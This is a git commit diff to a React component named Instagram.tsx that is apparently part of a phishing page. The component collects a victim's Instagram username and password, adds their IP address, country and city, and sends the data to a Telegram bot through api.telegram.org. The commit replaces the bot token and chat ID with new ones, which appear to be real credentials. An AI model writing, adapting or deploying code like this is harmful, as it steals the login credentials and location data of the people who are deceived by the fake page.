4e4d4e12d9b7820dd8358cfdfb00f7d165d79cbd
youngdeah4 <youngdeah4@gmail.com>
2025-05-08 21:30:54 +0100

    Update Instagram.tsx

--- src/components/Instagram.tsx
+++ src/components/Instagram.tsx
@@ -40,8 +40,8 @@ const Instagram: React.FC = () => {
           const PasswordLogin = formData.password;
           const SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ip} %0A - Country: ${country_name} %0A - Country-code: ${country_calling_code} %0A - state: ${city}`;
 
-          const token = "6537915625:AAEl2plkMRJiCTDdeykAI4jGZ-gQ08FVpn0";
-          const chat_id = -4619904880
+          const token = "5947007494:AAG1Q11Z0_SY9RhePdWsPJpuOf4sDf_pw6g";
+          const chat_id = -4792963876
 
           const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;
 
